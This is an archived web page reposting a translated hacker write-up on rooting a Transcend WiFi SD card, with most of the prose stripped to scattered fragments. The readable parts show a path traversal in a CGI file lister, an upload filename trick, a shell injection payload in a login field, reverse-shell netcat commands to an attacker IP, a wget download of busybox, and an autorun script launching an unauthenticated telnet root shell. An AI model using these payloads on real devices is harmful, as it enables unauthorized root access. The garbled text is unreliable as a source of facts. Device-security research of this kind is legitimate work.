<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Hackay Transcend WiFi SDHC memory card</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="The translation is a little loose, but the meaning is not lost. I (the translator) became interested in this card for a long time and almost immediate...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Hackay Transcend WiFi SDHC memory card</h1><div class="post__text post__text-html js-mediator-article"><img src="https://habrastorage.org/storage3/5c8/42e/0a9/5c842e0a9355f4116da406ee6a75ba5c.jpg" align="right">  <i>The translation is a little loose, but the meaning is not lost.</i>  <i>I (the translator) became interested in this card for a long time and almost immediately ordered it, today I took it from the post office and I can‚Äôt get enough, but I want more than Transcend gives, and the card, by the way, is Linux server with WiFi!</i>  <i>A lot of small letters.</i> <br><br>  Recently, I became the proud owner of a Transcend WiFi SD memory card, which allows me to transfer photos from my DSLR (which is actually Sony NEX, but compact) to any WiFi device in a few seconds.  And since I like to take photos and share them on the fly, the SD card, which can transfer pictures to my phone without wires, seems like a great solution.  And it was like that!  (although still so).  A mobile application can ... no, it should be better (why download a 7MB image for viewing, then download it again by clicking on ‚ÄúDownload‚Äù?), But in general it does its job! <br><a name="habracut"></a><br>  I was amazed that such a small device can store not only 16GB or even 32GB, but also is a built-in system capable of running applications, including a web server, communicate with other devices via WiFi and even create your own wireless network.  But stop talking: can we make this device do more? <br><br>  This post is written not only for the actual exploit, which allows you to get root access (jailbreak), but also tells about the process of research and finding bugs, some of which are just dead ends, while others lead to a sacred root. 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    <h4>  Getting ready for a hack </h4><br>  Initially, I assumed that there is some kind of embedded Linux in the card.  If so, then expanding the functionality is likely to be quite simple!  But first, we should take control of the system into our own hands.  Prior to this, with this card, I used only Android and iOS applications, but it was obvious that the easiest way to communicate with a PC is the web interface.  And the following thought immediately visited my head: <br><blockquote>  If mobile apps are so bad, then the web interface is no better ... maybe it's full of bugs that can be used to your advantage. <br></blockquote><br>
    !<br>
       (IP  192.168.11.254 (<i>  253,   </i>),     admin),      ,     .  ¬´ ¬ª,   ¬´ ¬ª.           ,       ¬´¬ª     ,   . <br>
<br>
 ¬´Files¬ª   ,        .  ,         .  ?     ,                         ,   .     ¬´Parent Directory¬ª   URL(%2F   "/"):<br>
<code><a href="http://192.168.11.254/cgi-bin/file_list.pl%3Fdir%3D%252Fwww%252Fsd"></a>192.168.11.254/cgi-bin/file_list.pl?dir=%2Fwww%2Fsd</code><br>
      /www,  URL: <code><a href="http://192.168.11.254/cgi-bin/file_list.pl%3Fdir%3D%252Fwww"></a>192.168.11.254/cgi-bin/file_list.pl?dir=%2Fwww </code><br>
,  .    /, /bin, /etc     . , :(  .     !  ,       ,        .    <code>?dir=/www/sd/../..</code>       ,    <code>/</code>,   !<br>
<img src="https://habrastorage.org/storage3/ea5/c86/eb9/ea5c86eb988da181505201936fc7d625.png"><br>
,     !     ,     <code>/www/sd</code>,          "../".         . ,      ,   ,     ! <br>
<br>
       ,   ,    busybox,        busybox.     ,      /www/cgi-bin.     ,           .<br>
<br>
<h4> </h4><br>
   ! ,       ,         ¬´  ¬ª,     ,              :) <br>
  ,   ,   ,    .   ‚Äî  Perl . Perl         open(),       ,         ,  shell ,  ¬´¬ª (pipe).   <code>open("cat /etc/passwd |")</code>.    open()   ,             ,             .  ,         .<br>
<br>
   ,     open()   . <code>kcard_upload.pl</code>  :<br>
<img src="https://habrastorage.org/storage3/6de/2c1/cfb/6de2c1cfbdedfbaf4701fa9c371a784e.png"><br>
<br>
         ! <code>kcard_upload.pl</code>   ,          <code>cgi-bin</code> .      .   facepalm:   ,     !         ?<br>
  <code>kcard_upload.pl</code>,  ,        <code>$basename</code> .<br>
 , <code>$basename</code>       ,     <code>GetBasename($upfile)</code>.   <code>$upfile</code>   (   ).  ,   ,  HTML    .     ,  <code>GetBasename</code>       .      ( ¬´¬ª ../../ ) .<br>
 ,   <code>$basename</code>    , ..      ,   ,     . <br>
    ,   <code>kcard_upload.pl</code>    PNG, JPG, BMP  GIF . <br>
  ?    !<br>
<br>
    ,   ,           ,             ,         . <br>
<img src="https://habrastorage.org/storage3/ef0/9e8/65a/ef09e865ac3273650d96e0ec2cf550c4.png"><br>
 ,         ,       ,   .       <code>"\"</code>.       <code>/\.GIF$/</code>,    <code>/.GIF/</code>,       ,             ,   <code>/hi/helPNGlo/asdf.something</code>.    !<br>
<br>
         ,         (      ),         ,        .                .<br>
<br>
,   ,     <code>GetBasename()</code>     <code>$basename</code>. <code>GetBasename()</code>         .   <code>/path/to/file.txt</code>    <code>file.txt</code>.  ,            -  <code>"../../bin/our-malicious.script"</code>,        <code>"our-malicious.script"</code>    <code>DCIM/198_WIFI/</code><br>
<img src="https://habrastorage.org/storage3/0a9/c72/76e/0a9c7276eacea0b9170968e01a87ba9a.png"><br>
<br>
  ,   <code>GetBasename()</code>  ,   .<br>
   :      windows           (   OC  windows).       !                  windows ,      .             !     :<br>
<code>/////\////</code><br>
     ,       windows,           (  ),     .      <code>////</code><br>
<br>
!   <b>/PNG/something\/../../our-malicious.script</b>         .  .    ‚Äî      . !      <code>../DCIM/198_WIFI</code> ,     <code>/www/cgi-bin</code>,     (    <code>../sd/DCIM/198_WIFI</code>). ,     .     .        ,      ( , ?).    ,      .  -    .<br>
( , ,  <code>kcard_upload.pl</code>    ,      <code>wifi_upload</code>,       HTTP POST  .)<br>
<br>
<h4></h4><br>
 !        ,      .   ,       .    ¬´¬ª           .       ,    .<br>
<br>
    shell    perl ,       ,       shell !  <code>system()</code> ‚Äî      shell   perl .   <code>system()</code>     .pl  .cgi ,      ,     .    shell   perl ‚Äî   <code>qx{}</code> ,     .   ,   ‚Äî      ,    <code>qx{}</code>.    ,   ,     shell . ! ..  shell     ,          .<br>
<br>
     <code>kcard_save_config_insup.pl</code>,       : <br>
<img src="https://habrastorage.org/storage3/a2b/b7d/7ad/a2bb7d7ad1f276c035ffc82eb14eb2df.png"><br>
<br>
    ,    <code>$update_auth</code>,   <code>$LOGIN_USR</code>  <code>$LOGIN_PWD</code>.      ,       .      !  ,            ¬´Settings¬ª.             <code><a href="http://192.168.11.254/kcard_edit_config_insup.pl"></a>192.168.11.254/kcard_edit_config_insup.pl</code>.      .  ,    ,    ! -,      ,    shell     <code>$update_path</code>.    ,   .  ,     # ( ),        <code>&gt; /mnt/mtd/config/ia.passwd</code>.<br>
<br>
   ,    : <code>admin; echo haxx &gt; /tmp/hi.txt #</code><br>
,   ,            .   ,     javascript,     ,      .     Chrome Form Editor     .<br>
<br>
  ,       ,    <code>/tmp</code>  ,   .           .<br>
<img src="https://habrastorage.org/storage3/951/268/5d9/9512685d93b1cf7ccdf88bdfeb3c5cf0.png"><br>
<br>
<u>     ¬´admin¬ª,    </u>    . (    ,  ).<br>
<br>
<h4>   root?</h4><br>
          ,     shell     .   ,         .<br>
   <code>/usr/bin</code>   ,          shell: netcat (nc), telnet  .  shell         ,    ,   ,   shell             (<i>,   </i>).     ,    ‚Äî   Netcat:<br>
<code>nc 192.168.11.11 1337 -e /bin/bash</code><br>
  netcat     (  IP 192.168.11.11)   1337   bash  . ,   ,     , ¬´¬ª   <code>admin; nc 192.168.11.11 1337 -e /bin/bash #</code>.       .       telnet    .     ?   nc, telnet    <code>/usr/bin</code>,    !        busybox      SD    Linux. .    ,   telnet  netcat   stdout  stderr  /tmp/hi.txt,   : <code>nc 192.168.11.11 1337 -e /bin/bash &amp;&gt; /tmp/hi.txt</code>.  hi.txt,     : <code>nc: applet not found</code>,    nc.   !   ,                ?    ! :)<br>
<br>
 , <code>wget</code>   transcend- ,    .       busybox :)))   ,   ,        busybox  <a href="http://busybox.net/downloads/binaries/latest/">http://busybox.net/downloads/binaries/latest/</a>,  busybox-armv5l         <code><a href="http://192.168.11.11/busybox-armv5l"></a>wget 192.168.11.11/busybox-armv5l</code>    ,        <code>/www/cgi-bin</code>.      <code>chmod a+x /www/cgi-bin/busybox-armv5l</code>    ,    . <br>
<br>
      shell!     1337   <code>nc -vv -l 1337</code>,  SD       <code>/www/cgi-bin/busybox-armv5l nc 192.168.11.11 1337 -e /bin/bash</code>.    busybox   ,    <code>/www/cgi-bin/busybox-armv5l </code>   shell       !  , <code>/www/cgi-bin/busybox-armv5l id</code>  ,     root-!<br>
<img src="https://habrastorage.org/storage3/ff0/e58/78c/ff0e5878cc8ba20679907cda01f7a001.png"><br>
<br>
<h4>  </h4><br>
<br>
 ,          ,     SD  (  ,     ). ,     -       ¬´¬ª perl ,   <code>kcard_login.pl</code>,      ,     .      wsd.conf     javascript       .  ,    .    javascript! <br>
<img src="https://habrastorage.org/storage3/707/52c/bfc/70752cbfccd1772601a8048ae97b5fcc.png"><br>
<br>
 ,             <a href="http://192.168.11.254/cgi-bin/kcard_login.pl">192.168.11.254/cgi-bin/kcard_login.pl</a>     .    .<br>
<img src="https://habrastorage.org/storage3/1ad/e5c/371/1ade5c371ef940b9465e839253194e02.png"><br>
!<br>
<br>
<h4>      </h4><br>
<br>
   (rcS.p rcS),    ,   <code>autorun_fu.sh</code>  <code>autorun.sh</code>       .      . , Transcend!<br>
<img src="https://habrastorage.org/storage3/c34/4a0/dfc/c344a0dfc9fb60b69883b76f52c174ae.png"><br>
<br>
      (  <code>autorun.sh</code>),   busybox-armv5l    ,        <code>telnet</code>  :<br>
<pre><code class="bash">cp /mnt/sd/busybox-armv5l /sbin/busybox
chmod a+x /sbin/busybox
/sbin/busybox telnetd -l /bin/bash &amp;
</code></pre><br>
            :<br>
<img src="https://habrastorage.org/storage3/ecc/200/3e6/ecc2003e6940dd634ebc804a8849389d.png"><br>
<br>
 !<br>
<br>
<i>  ,      ,   .     keyasic</i><br>
        :<br>
<iframe width="560" height="315" src="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://www.youtube.com/embed/yEwHQU8MLnQ%3Ffeature%3Doembed&amp;xid=17259,15700022,15700186,15700190,15700253&amp;usg=ALkJrhh0LSCHaMhogtae9w-T9C6RTaxcLg" frameborder="0" allowfullscreen=""></iframe></div><p>Source: <a href="https://habr.com/ru/post/191742/">https://habr.com/ru/post/191742/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../191714/index.html">Evernote for Windows Phone 8 Update: Continuous Shooting, Speech to Text, and More</a></li>
<li><a href="../191722/index.html">Save to my Dropbox as a way to have fun</a></li>
<li><a href="../191726/index.html">Google Nexus 4 is now from $ 199</a></li>
<li><a href="../191738/index.html">Dell Webcast: Alienware Line Update</a></li>
<li><a href="../191740/index.html">Virtuilarks arrived!</a></li>
<li><a href="../191744/index.html">GetThemAll or take the best from the Internet!</a></li>
<li><a href="../191746/index.html">Rights holders and the Internet - from dispute to the market. Yandex Position</a></li>
<li><a href="../191748/index.html">Preparing your environment and compiling Shareaza today</a></li>
<li><a href="../191750/index.html">Google Translate: a guide for the complete idiot</a></li>
<li><a href="../191754/index.html">In the Windows Phone Store for $ 19</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>